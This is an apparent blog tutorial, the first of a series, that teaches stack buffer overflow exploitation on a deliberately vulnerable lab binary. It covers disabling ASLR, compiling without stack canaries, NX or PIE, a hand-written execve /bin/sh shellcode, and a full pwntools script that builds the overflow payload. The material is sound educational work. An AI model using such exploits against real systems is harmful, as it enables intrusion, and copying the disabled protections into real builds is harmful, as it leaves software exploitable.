---
author: "Laluka"
title: "PWN 1/4 : Buffer Overflow, where it all began"
slug: "pwn_1of4_buffer_overflow"
date: 2018-05-03
description: "Introduction to binary exploitation, ELF format and shellcode writing. "
---

> Small edit after the initial publication of the articles:

> These four articles lead me to give an "pwn introductory" conference at the HitchHack 2018. It summarizes the first 3 articles but goes less into detail. If this format suits you better, the slides are downloadable[here] (/hacking/pwn_1of4_buffer_overflow/slides_conf_123_pwned.pdf) and the video (French only) here :

[![1, 2, 3, PWNED !](http://img.youtube.com/vi/hmt8M9YLwTg/0.jpg)](https://www.youtube.com/watch?v=hmt8M9YLwTg)

## printf("Mr, Ms %s, bonjour. ", lecteur);

Today, I want to offer you an article more sophisticated than usual, the first of  new kind, an article dealing with heavy stuff, in short, an article that blows ass!

<img class="img_med" src="/hacking/pwn_1of4_buffer_overflow/patrick.jpg" alt="patrick" >

The concept discussed today is quite extensive, so I know that many of you, among my usual readers, will not necessarily be able to understand the entire article, which is why I will try to make it interesting even for neophytes. So if you are a sorcerer's apprentice, be relentless, enjoy it, otherwise, you wan see it as a black magic trick, it's beautiful, it's powerful, but you don't have to understand everything to appreciate it :)

This article is therefore the first of a small series dedicated to buffers overflow!

One last thing before we start.... \
A big shout out to Cyril Bresch who gave me the right to use some of his exercises for this introduction BOF. But especially thanks to him for introducing me to binary exploitation (Well, ok you were paid, but still! :D). \
His personal website is hosted here: https://cyrilbresch.fr/

What comes next? Shellcodes, assembly, ret2libc, rop, and much more. None of these words mean anything to you? It's normal, don't worry, we'll start easy with some context.

I will try a recursive definition: I start by defining the core of the subject, and every time a new term appears, I define it right after. This should, I hope, allow a fluid reading! :)

## Buffer overflow, Watizit?

 * Buffer:

Small recipient in which we store pieces of information in a program. Most of the time, this buffer will contain chars, or a sequence of numbers, or whatever, anyway, they are bits stuck together that form bytes. Buffers are usually stored on the heap or in the stack.

 * Overflow :

Action that consists in exceeding the initial size of a buffer, thus affecting the values stored after said buffer. We as hackers are happy when a lot of very useful data can be found after the buffer. The most convenient case being to control the instruction pointer (a register), which tells which piece of code should be executed next. Be able do modity it, and you're all done!
There are many ways to perform an overflow, but also many protections in place.

 * Program:

"Well, I know what a program is, you click on it and it starts, how lame!"

Sure... But no really. You got the core idea, but most programs work in a command line interface, i.e. they are run by typing commands into a shell. Unlike with windows, where most of the time it is the extension of the file (.txt, .exe, ...) that determines its type, with linux, it is rarely used, we got much better. The window's way of doing so is itself a huge security flaw. More information about this kind of issue here: [article_RTLO](https://blog.malwarebytes.com/cybercrime/2014/01/the-rtlo-method/)

What replaces this practice is the use of a magic number. It is a sequence of bytes that is put at the beginning of the file and which allows the system to know the type of file it is and version of it. Here, for an ELF, we see:

<img class="img_full" src="/hacking/pwn_1of4_buffer_overflow/readelf.png" alt="readelf" >

Two notable things here:\
 - 45 4c 46 is the ELF's ASCII code: Executable and Linkable Format\
 - Type of architecture to launch it: X86-64, so 64 bits.

 * Architecture :

There are many types of processors, and each processor has its own set of instructions. Although standards are adopted by manufacturers, each processor retains its own particularities. A non-exhaustive list is available here: https://en.wikipedia.org/wiki/List_of_instruction_sets

The most common architectures are: x86, x86-64, arm, mips,...

x86 refers to the usual 32bits, and x86-64 to the 64 bits. This difference is due to the size of the registers used for addresses and operation management. A program x32 will work on both archs, but a x64 program will only work on a x64 machine.

 * Linux :

Linux is not Unix. If you're there, it's never too late! In short, a large family of open source OS.

[Linux introduction](https://openclassrooms.com/courses/reprenez-le-controle-a-l-aide-de-linux/mais-c-est-quoi-linux)

 * Shell :

A shell is a command interpreter. Seen from afar, this is where hooded people type green lines of code on a black terminal. They exist on all OSes because it is necessary to communicate with the system this way. Attention, for each system, there are several implementations and versions.

Example (linux): sh / bash / dash / zsh / fish / ...

 * Stack:

The stack is a place used by the processor to store data. It is a LastInFirstOut file. In other words, the last element to be pushed is the first to be popped.

<img class="img_med" src="/hacking/pwn_1of4_buffer_overflow/stack.png" alt="stack" >

 * Heap :

The heap also allows data to be stored, but in a more dynamic / flexible way. It is used (not exclusively) when the malloc functions (memory allocation during program execution) is called.

 * Function:

A series of assembly instructions starting (most of the time...) by booking space on the stack to process data locally, and ending with `leave` and `ret` to let the calling program resume at the initial calling state.

 * Shellcode :

A series of assembler instructions that spawns a shell.

 * Bits :

 A data that is worth 0 or 1, atomic unit.

 * Byte :

 A sequence of 8 bits, encoding an number between 0 and 255.

Well, take a break, take a deep breath, make yourself comfy in your chair... \
And we're going back!

## Disable security:

The first thing to do for a first approach is to disable the protections in place, because trying to learn this subject with all the protections currently used: RIP!

We start by disabling the ASLR, it is a kernel parameter (kernel of the system, which manages almost everything) that indicates whether or not to place the different segments of a program at random addresses. Here, we will use the stack, so we don't want it to move at all.

```shell
# As root:
echo 0 > /proc/sys/kernel/randomize_va_space
```

We will then compile the program so that:

- There is no stack canary, in other words, no value placed at the end of the buffer, which is checked and screams if it has been overwritten (so if it detects a buffer overflow)

- The stack is executable, otherwise, an NX bit is placed there. This bit of information means that it is not possible to execute the data (here assembly instructions) found there. It is therefore impossible for us to execute the code of our choice.

- The Position Independent Code is disabled (do not place the different segments of our program in random places).

We therefore use the following compilation line:

```shell
$ gcc -o vuln -fno-stack-protector -no-pie -z execstack vuln.c
```

We will also need a few tools:

* python: Language and interpreter, version 2 for less annoying encoding reasons

* gdb : Gnu debugger, useful to understand what's going on in the program

* gdb-peda: gdb improved with python scripting, makes gdb easier to use

* pwntool : Not much used here, this python tool makes it easier to perform binary exploits

## Recon

The studied binary is downloadable[here](/hacking/pwn_1of4_buffer_overflow/vuln)

Okay, it needs an argument. What is done with it?

Seems like, nothing... It's only a test program, we don't care! `¯\_(ツ)_/¯`

<img class="img_full" src="/hacking/pwn_1of4_buffer_overflow/recon.png" alt="recon" >

Find the crash:

The usual beginner strategy, long arguments.

<img class="img_full" src="/hacking/pwn_1of4_buffer_overflow/crash.png" alt="crash" >

Hey, that looks good!

Let's just pass it a long argument in order to make it crash!

Offset research:

<img class="img_full" src="/hacking/pwn_1of4_buffer_overflow/pattern_create.png" alt="pattern_create" >

Create the pattern (easily recognizable, that will be used to understand which registers are reachable by our input), then run the program with the pattern as parameter.

We see here that the crash occurs on the `ret` instruction (code section, small arrow on the left).

<img class="img_full" src="/hacking/pwn_1of4_buffer_overflow/pattern_run.png" alt="pattern_search" >

After the crash, we search the pattern in the memory:

<img class="img_full" src="/hacking/pwn_1of4_buffer_overflow/pattern_search.png" alt="pattern_search" >

The memory analysis has found pieces of our pattern in different places, so we see that the RSP (Registre Stack Pointer) is 40 bytes away from our input start.

But we already know that the crash occurs on a ret. Ret is an instruction that stores the last element of the stack in RIP (Instruction Pointer) to return to the main program in order to continue its execution. So controlling RSP before a ret means controlling  RIP. Controlling RIP means being able to divert the execution flow of or target, and...

And it's a win-win! `^~^`

Shellcode search:

We do know where we are going to inject. What we now need a shellcode, a good one, a real one! :D

A quick tour on [shellstorm](http://shell-storm.org/shellcode/) or [exploit-db](https://www.exploit-db.com/), choose the right architecture, ...

Here, the shellcode is homemade, because the general idea remains the same: Place the right parameters in the registers, then trigger a syscall so that the kernel executes what you want, here a shell.

Shellcode :

`\x48\xB8\x2F\x2F\x62\x69\x6E\x2F\x73\x68\x48\xC1\xE8\x08\x50\x48\x89\xE7\x48\x31\xC0\xB0\x3B\x48\x31\xF6\x48\x31\xD2\x0F\x05`


We're still going to disassemble it to understand what it does, thanks to this site: https://onlinedisassembler.com

<img class="img_full" src="/hacking/pwn_1of4_buffer_overflow/shellcode.png" alt="shellcode" >

```
0  : "//bin/sh" dans rax
A  : "/bin/sh\x00" dans rax
E  : push rax in the stack
F  : rdi now points to the stack
12 : 0 in rax
15 : 59 in rax (execve)
17 : 0 in rsi
1a : 0 in rdx
1d : Init the syscall
```

This will execute `/bin/sh` using the execve syscall.

The parameters to use are found using this doc: \
https://w3challs.com/syscalls/?arch=x86_64


## Development of the exploit

We want to put our shellcode in a known place, then reach a size of 40 bytes to place the address of the shellcode to execute. Yapluka!

Our payload (data sent during the attack) will therefore have the following structure:\
PADDING + SHELLCODE + SHELLCODE_ADDRESS

To find out where the data entered by the user is located, in gdb:

Disassemble the main (name convention for the main function of the program), define a breakpoint before the end of the execution, then run it with AAAA as a parameter.

<img class="img_full" src="/hacking/pwn_1of4_buffer_overflow/disas_main.png" alt="disas_main" >

<img class="img_full" src="/hacking/pwn_1of4_buffer_overflow/find.png" alt="find" >

Once stopped, our input is in the stack, at the address: 0x7fffffffe570

And our shellcode will be a little farther, because of the padding.

Python code of the exploit:


```python
#!/usr/bin/env python2

from pwn import *

def save(what, where):
  with open(where, "wb") as f:
    f.write(what)

shellcode = "\x48\xB8\x2F\x2F\x62\x69\x6E\x2F\x73\x68"
shellcode += "\x48\xC1\xE8\x08\x50\x48\x89\xE7\x48\x31"
shellcode += "\xC0\xB0\x3B\x48\x31\xF6\x48\x31\xD2\x0F\x05"

offset = 40
count_A = offset - len(shellcode)
padding = "A" * count_A
addr_input = 0x7fffffffe570 # Depends on your OS
addr_shellcode = addr_input + count_A
log.info("Shellcode at 0x{:8x}".format(addr_shellcode))

payload = padding + shellcode + p64(addr_shellcode)

save(payload, "payload")
log.success("Payload written")
```

To run the exploit, all you have to do is give its output to the program as an argument:

<img class="img_full" src="/hacking/pwn_1of4_buffer_overflow/run_exploit.png" alt="run_exploit" >

And BIM! Spawned a shell! `\o/`

<img class="img_small" src="/hacking/pwn_1of4_buffer_overflow/like_a_boss.png" alt="like_a_boss" >

## Notes and Reflection:

 * Note 1

In this example, an error has been hidden, will you be able to find it?

 *-[ SPOIL ]-*

 This shellcode contains null-bytes (`\x00`, a sentinel which in C, refers to the end of a string) that are very poorly managed by bash. If the argument had been passed directly, bash would have cut it off. Going through a file allows you to send everything to the program, even null-bytes. But this does not solve the problem entirety. Indeed, the vulnerable function here is strcpy. It copies a string and stops at the first sentinel (i.e. null-byte, i.e. 0x00, i.e. ShellCodeBreakerOfDoom). Our exploit still works because they appear at the end or our payload as an address. And we paste this stack address on... A stack address, so the 0x00 are already present.

 Thinking: How to fix the shellcode so that it no longer uses null-byte?

  * Note 2

 This example is limited because the size available before the EIP is very small. That's enough for spawning a shell, but not for much more. In addition, since this space is close to the addresses used, it may be altered during execution. It's annoying, isn't it?

 Reflection: How to use a shellcode of arbitrarily long size?

  * Note 3

 This example only works if the ASLR is disabled because it is highly dependent on the stack. There are many ways to bypass the ASLR... More in the next articles... Pwn-knowledge, one drop at a time! :D

 Huh ? You read this far? Hatzoff, my friend!

 You're a magician now! Almost... ;)

 <img class="img_small" src="/hacking/pwn_1of4_buffer_overflow/blair.png" alt="blair" >

 This being my first article on the subject, I know it will be incomplete, and full of inaccuracies if not errors. Feedback are welcome for typos, missing details, errors, ... `^.^`

  * Hints

 -Use... Xor? Add? Sub? Other? \
 -Environmental variables? Order of the padding and shellcode in out payload?

 I hope you appreciated this first step into the pwning world,
